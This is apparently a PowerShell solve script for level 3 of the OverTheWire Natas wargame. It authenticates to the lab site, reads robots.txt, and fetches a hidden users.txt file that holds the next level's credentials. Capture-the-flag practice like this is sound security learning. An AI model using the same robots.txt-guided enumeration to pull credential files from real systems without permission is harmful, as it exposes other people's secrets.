
$currentLevel = 3
$currentPassword = ''
$currentURL = "http://natas$($currentLevel).natas.labs.overthewire.org"
$currentUsername = "natas$currentLevel"
$credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $currentUsername,$(convertTo-SecureString -AsPlainText -Force -String $currentPassword)

$page = Invoke-WebRequest $currentURL -Credential $credential -SessionVariable session
$page.Rawcontent
(Invoke-WebRequest "$currentURL/robots.txt" -Credential $credential).Rawcontent
(Invoke-WebRequest "$currentURL/s3cr3t/users.txt" -Credential $credential).Rawcontent





